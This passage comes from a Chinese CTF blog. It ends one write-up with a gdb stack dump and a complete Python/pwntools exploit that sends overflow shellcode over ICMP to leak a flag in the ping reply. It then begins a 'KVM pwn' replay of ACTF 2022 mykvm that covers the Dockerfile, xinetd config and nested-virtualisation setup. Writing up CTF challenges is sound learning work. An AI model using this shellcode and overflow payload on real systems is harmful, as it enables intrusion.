class="number">0x10a6b4</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│  <span class="number">0x1907fd0</span> —▸ <span class="number">0x1907ff0</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│ esp <span class="number">0x1907fd4</span> —▸ <span class="number">0x10014b</span> —▸ <span class="number">0xc710c483</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│     <span class="number">0x1907fd8</span> —▸ <span class="number">0x10c8ac</span> —▸ <span class="number">0xffffffff</span> —▸ <span class="number">0xff5300</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">0</span>a:<span class="number">0028</span>│     <span class="number">0x1907fdc</span> —▸ <span class="number">42</span> —▸ <span class="number">0xd442f000</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">0b</span>:<span class="number">002</span>c│     <span class="number">0x1907fe0</span> —▸ <span class="number">0x10c280</span> —▸ <span class="number">0x1e0f4e06</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">0</span>c:<span class="number">0030</span>│     <span class="number">0x1907fe4</span> —▸ <span class="number">0x10c878</span> —▸ <span class="number">42</span> —▸ <span class="number">0xd442f000</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">0</span>d:<span class="number">0034</span>│     <span class="number">0x1907fe8</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0038</span>│     <span class="number">0x1907fec</span> —▸ <span class="number">0x10000</span> —▸ <span class="number">0x1a67</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">0f</span>:<span class="number">003</span>c│ ebp <span class="number">0x1907ff0</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>测试代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">10</span>  </span><br><span class="line">payload += shellcode.ljust(<span class="number">478</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x10C8Ac</span>) </span><br><span class="line">payload += p32(<span class="number">0x10a6b4</span>)</span><br><span class="line">payload += p32(<span class="number">0x10a6b4</span>)</span><br><span class="line">payload += p32(<span class="number">0x1907ff0</span>)</span><br><span class="line">payload += p32(<span class="number">0x10c8e0</span>) <span class="comment"># shellcode addr</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload &gt;&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br></pre></td></tr></table></figure>
<p>最后只需要写一个 shellcode 就解决问题了：</p>
<ul>
<li>我最开始的想法是直接执行 printf 把 flag 打印出来，后来发现 run.sh 中有 <code>-display none</code>，即使真的打印出来了也看不见（其实我把 <code>-display none</code> 去掉以后，也没能成功）</li>
<li>后来参考了网上的做法：因为我们和目标系统只有 ping 包的通信，并且可以收到 ping 的回包，所以利用 shellcode 把 flag 写到 ICMP 的 echo 报文中，然后在 ping 的回包中查看 flag</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    // memcpy(0x10c370,0x350000,0x20)</span></span><br><span class="line"><span class="string">    push 0x20</span></span><br><span class="line"><span class="string">    push 0x350000</span></span><br><span class="line"><span class="string">    push 0x10c370</span></span><br><span class="line"><span class="string">    mov  eax, 0x108AA9</span></span><br><span class="line"><span class="string">    call eax</span></span><br><span class="line"><span class="string">    add  esp, 0xc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov  eax, 0x10014B</span></span><br><span class="line"><span class="string">    jmp  eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">10</span></span><br><span class="line">payload += shellcode.ljust(<span class="number">478</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x10C8Ac</span>) </span><br><span class="line">payload += p32(<span class="number">0x10a6b4</span>)</span><br><span class="line">payload += p32(<span class="number">0x10a6b4</span>)</span><br><span class="line">payload += p32(<span class="number">0x1907ff0</span>)</span><br><span class="line">payload += p32(<span class="number">0x10c8e0</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload &gt;&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p = sr1(IP(dst=<span class="string">&quot;10.10.10.10&quot;</span>)/ICMP()/payload)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>第一次遇到这种题目，学到了很多关于 web 的知识：</p>
<ul>
<li>配置虚拟网卡</li>
<li>iptables 的使用</li>
<li>ICMP 协议及其类型字段</li>
<li>死亡之 ping</li>
</ul>
<p>最后这个题目卡在了 shellcode 上，我参考了网上某个大佬的 wp 才搞出来，大佬最后还计算了效验和，不过我没有计算效验和也拿到 flag 了</p>
<p>之后就一直在调试效验和，验证 sub_1023E3 函数的功能，但是 GDB 中它调用时候没有起到预期的效果，而最终抓包却显示结果正常</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/12/KVM%20pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/12/KVM%20pwn/" class="post-title-link" itemprop="url">KVM pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-12 17:27:37 / Modified: 17:28:25" itemprop="dateCreated datePublished" datetime="2022-07-12T17:27:37+08:00">2022-07-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>mykvm 复现</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    <span class="built_in">type</span>        = UNLISTED</span><br><span class="line">    port        = <span class="number">8888</span></span><br><span class="line">    bind        = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">    server      = /home/ctf/mykvm</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    <span class="comment"># safety options</span></span><br><span class="line">    per_source	= <span class="number">10</span> <span class="comment"># the maximum instances of this service per source IP address</span></span><br><span class="line">    rlimit_cpu	= <span class="number">20</span> <span class="comment"># the maximum number of CPU seconds that the service may use</span></span><br><span class="line">    <span class="comment">#rlimit_as  = 1024M # the Address Space resource limit for the service</span></span><br><span class="line">    <span class="comment">#access_times = 2:00-9:00 12:00-24:00</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mykvm: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">1993</span>c72c363459deb6e3280880959d1f83620724, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，开了 NX，Canary，FORTIFY</li>
</ul>
<p>运行时出现以下报错：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./mykvm </span><br><span class="line">./mykvm: error <span class="keyword">while</span> loading shared libraries: libreadline.so<span class="number">.6</span>: cannot open shared object file: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure>
<ul>
<li>证明系统已经升级 libreadline.so.6 到 libreadline.so.7 或者 libreadline.so.8</li>
</ul>
<p>使用以下命令就可以解决：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  x86_64-linux-gnu sudo ln -s libreadline.so<span class="number">.8</span><span class="number">.0</span> libreadline.so<span class="number">.6</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我的电脑上是 libreadline.so.8，如果是 libreadline.so.7 修改命令即可</li>
</ul>
<p>拖入 IDA 分析，发现如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/dev/kvm&quot;</span>, <span class="number">524290</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  errx(<span class="number">1</span>, <span class="string">&quot;failed to open /dev/kvm&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>在我的 ubuntu 上没有 <code>/dev/kvm</code></li>
<li>学习 kvm：<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_1054383/1664143">/dev/kvm简单理解</a></li>
</ul>
<p>学习了一下陌生的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">readline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>prompt：指向提示字符串</li>
<li>readline 的返回值就是该行文本的指针：<ul>
<li>如果是一个空行,那么将返回一个空的字符串</li>
<li>如果在读某一行的过程中遇到了EOF错误，并且是空行的话，便会返回NULL</li>
<li>如果不是空行的话，便会将其当做新的一行</li>
</ul>
</li>
<li>返回值由 malloc() 分配的空间存储，故调用结束后应通过 free() 显式地释放内存 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_history</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">string</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>我们希望输入过的命令行，还可以通过 <code>C-p</code> 或者 <code>C-s</code> 来搜索到，那么就需要将命令行加入到历史列表中，可以调用 <code>add_history()</code> 函数来完成</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offsize)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>start：指向欲对应的内存起始地址，通常设为NULL，代表让系统自动选定地址，对应成功后该地址会返回</li>
<li>length：代表将要把文件映射到内存的字节大小</li>
<li>prot：代表映射区域的保护方式 </li>
<li>flags：会影响映射区域的各种特性</li>
<li>fd：文件描述词，代表欲映射到内存的文件</li>
<li>offset：文件映射的偏移量，通常设置为“0”，代表从文件最前方开始对应，offset 必须是分页大小的整数倍</li>
</ul>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hazir/p/instruction_to_readline.html">GNU Readline 库及编程简介</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7e7a43e98957">mmap函数详解与代码实操</a> </li>
</ul>
<p><strong>KVM (kernel-based virtual machine) 简述</strong></p>
<p><code>/dev/kvm</code> 设备是 kvm(kernel-based virtual machine) 虚拟机的一个设备文件</p>
<p>一，qemu 是一个模拟软件，运行于 linux 的用户空间，qemu 可以模拟我们能见到的所有操作系统，由于是通过模拟的方法来实现系统虚拟化，它产生的所有 CPU 指令都翻译转换一次，因此其性能非常低</p>
<p>二，kvm 是一个运行于内核空间的程序，为了提供一个整体的解决方案（包括用户空间工具集[由qemu提供]，管理各种设备[由kvm内核模块提供]），kvm 开发团队借用了 qemu 代码，并作了一些修改，形成了一套工具，也就是 qemu-kvm（不是linux中的命令） </p>
<p>三，<code>/dev/kvm</code> 是一个字符设备，其核心作用就是让 qemu 与 kvm 内核模块结合起来，当 qemu 打开这个设备后，通过 ioctl 这个系统调用就可以获得 kvm 模块提供的三个抽象对象：</p>
<ul>
<li>kvm：代表 kvm 模块本身，用来管理 kvm 版本信息，创建一个 vm(通过)</li>
<li>vm：代表一个虚拟机，通过 vm 的 io_ctl 接口，可以为虚拟机创建 vcpu，设置内存区间，创建中断控制芯片，分配中断等等</li>
<li>vcpu：代表一个 vcpu，通过 vcpu 的 io_ctl 接口，可以启动或者暂停 vcpu，设置 vcpu 的寄存器，为 vcpu 注入中断等等</li>
</ul>
<p>Qemu 的使用方式:</p>
<ul>
<li>打开 /dev/kvm 设备</li>
<li>通过 KVM_CREATE_VM 创建一个虚拟机对象</li>
<li>通过 KVM_CREATE_VCPU 为虚拟机创建 vcpu 对象</li>
<li>通过 KVM_RUN 设置 vcpu 运行起来</li>
</ul>
<p>因此，<code>/dev/kvm</code> 只是 kvm 内核模块提供给用户空间的一个接口，这个接口被 qemu-kvm 调用，通过 ioctl 系统调用就可以给用户提供一个工具用以创建，删除，管理虚拟机</p>
<p><strong>Docker 搭建环境</strong></p>
<p>题目给了 Dockerfile：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:16.04</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd gdb vim python git</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 8888</span><br></pre></td></tr></table></figure>
<p>在目录下执行以下命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build .</span><br></pre></td></tr></table></figure>
<p>第一个 images 就是目标了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker images</span><br><span class="line">REPOSITORY        TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">&lt;none&gt;            &lt;none&gt;    <span class="number">94</span>c320b3bb31   <span class="number">2</span> minutes ago   <span class="number">760</span>MB</span><br><span class="line">docker_fpm        latest    <span class="number">842968b</span>ef75b   <span class="number">7</span> days ago      <span class="number">461</span>MB</span><br><span class="line">docker_nginx      latest    <span class="number">51</span>a1d3e9b89d   <span class="number">7</span> days ago      <span class="number">150</span>MB</span><br><span class="line">pwn_ubuntu20<span class="number">.04</span>   <span class="number">20.04</span>     dda29e818595   <span class="number">6</span> months ago    <span class="number">2.25</span>GB</span><br><span class="line"></span><br><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker tag <span class="number">94</span>c320b3bb31 mykvm:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker images</span><br><span class="line">REPOSITORY        TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">mykvm             <span class="number">16.04</span>     <span class="number">94</span>c320b3bb31   <span class="number">5</span> minutes ago   <span class="number">760</span>MB</span><br><span class="line">docker_fpm        latest    <span class="number">842968b</span>ef75b   <span class="number">7</span> days ago      <span class="number">461</span>MB</span><br><span class="line">docker_nginx      latest    <span class="number">51</span>a1d3e9b89d   <span class="number">7</span> days ago      <span class="number">150</span>MB</span><br><span class="line">pwn_ubuntu20<span class="number">.04</span>   <span class="number">20.04</span>     dda29e818595   <span class="number">6</span> months ago    <span class="number">2.25</span>GB</span><br></pre></td></tr></table></figure>
<p>尝试在 docker 中运行题目文件：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="string">bin</span>  <span class="string">dev</span>  <span class="string">flag</span>  <span class="string">lib</span>  <span class="string">lib32</span>  <span class="string">mykvm</span></span><br><span class="line"><span class="comment"># ./mykvm</span></span><br><span class="line"><span class="attr">your code size:</span></span><br><span class="line"><span class="number">400</span></span><br><span class="line"><span class="attr">your code:</span></span><br><span class="line"><span class="string">yhellow</span></span><br><span class="line"><span class="attr">guest name:</span> <span class="string">yhellow</span></span><br><span class="line"><span class="attr">guest passwd:</span> <span class="string">yhellow</span></span><br><span class="line"><span class="attr">mykvm:</span> <span class="string">failed</span> <span class="string">to</span> <span class="string">open</span> <span class="string">/dev/kvm</span></span><br></pre></td></tr></table></figure>
<ul>
<li>docker 没有 <code>/dev/kvm</code>，只能想其他办法</li>
<li>PS：启动 docker 时需要添加 -privilage 参数，来允许在 docker 使用 kvm </li>
</ul>
<p><strong>VMware Workstation 16 搭建环境</strong></p>
<p>输入下面的<code>grep</code>命令来看看是否支持硬件虚拟化： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin grep -Eoc <span class="string">&#x27;(vmx|svm)&#x27;</span> /proc/cpuinfo</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果 CPU 支持硬件虚拟化，这个命令将会打印出大于“0”的数字，这代表 CPU 核心数目</li>
<li>否则，如果输出为“0”，它意味着这个 CPU 不支持硬件虚拟化</li>
</ul>
<p>在一些机器上，虚拟化技术可能被厂商在 BIOS 中禁用了，运行下面的命令可以进行查看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/kvm-ok <span class="comment">/* kvm-ok需要安装 */</span></span><br></pre></td></tr></table></figure>
<p>也可以通过任务管理器查看：</p>
<img src="/2022/07/12/KVM%20pwn/1657352744964.png" class width="1657352744964"> 
<ul>
<li>已经在BIOS中开启了VT功能</li>
</ul>
<p>关闭虚拟机，在虚拟机设置中勾选 <code>虚拟化引擎</code> 中的前两个：</p>
<img src="/2022/07/12/KVM%20pwn/1657269118245.png" class width="1657269118245">  
<p>得到报错：</p>
<img src="/2022/07/12/KVM%20pwn/1657269160910.png" class width="1657269160910"> 
<p>参考以下博客：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46499134/article/details/124231658?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-124231658-blog-106523106.pc_relevant_multi_platform_whitelistv1&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-124231658-blog-106523106.pc_relevant_multi_platform_whitelistv1&amp;utm_relevant_index=1">关于“ VMware Workstation 16 此平台不支持虚拟化的Intel VT-x/EPT</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Officialcareer/article/details/120800562">VMware Workstation 16 在此主机上不支持嵌套虚拟化 修复方法</a> </li>
</ul>
<p>最后问题终于解决了（但是 win docker 的环境挂了），要完全关闭 Hyper-V，WSL，同时还要关闭内核隔离（虚拟机访问物理资源时需要通过 VMM 去建立一个虚拟的Ring0权限，内核隔离开启后，默认会启动 Hyper-V）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin grep -Eoc <span class="string">&#x27;(vmx|svm)&#x27;</span> /proc/cpuinfo</span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure>
<p><strong>调试方法</strong></p>
<p>为了调试环境与题目环境一样，只能使用 docker，但是 win 中的 docker 环境挂了…</p>
<p>最后选择在 ubuntu 中下载了一个 docker，然后利用 Dockerfile 直接在 ubuntu 上搭环境：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t mykvm -f Dockerfile .</span><br></pre></td></tr></table></figure>
<p>然后即可启动，一定要后台启动才能跟远程堆环境保持一致，另外还要加 <code>--privileged</code> 参数以便在 docker 内访问 kvm 设备 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  docker docker container run --privileged -p <span class="number">1234</span>:<span class="number">1234</span> -p <span class="number">8000</span>:<span class="number">8888</span> -d mykvm</span><br><span class="line"><span class="number">4b</span>1755d23dc28a56ffafa5ec9cbd5fc0fcb1625a90c0cde88ab3d8ebe8e71f65</span><br><span class="line">➜  docker docker exec -it <span class="number">4b</span>1755d23dc28a5 /bin/bash </span><br><span class="line">root@<span class="number">4b</span>1755d23dc2:/home/ctf# </span><br></pre></td></tr></table></figure>
<p>接下来就可以进入 docker 使用 gdbserver 挂调试器，然后外部连入调试即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">9622b</span>ccfc102:/home/ctf<span class="meta"># ip addr show</span></span><br><span class="line"><span class="number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="number">65536</span> qdisc noqueue state UNKNOWN group <span class="keyword">default</span> qlen <span class="number">1000</span></span><br><span class="line">    link/loopback <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> brd <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">    inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8</span> scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">5</span>: eth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue state UP group <span class="keyword">default</span> </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">11</span>:<span class="number">00</span>:<span class="number">02</span> brd ff:ff:ff:ff:ff:ff link-netnsid <span class="number">0</span></span><br><span class="line">    inet <span 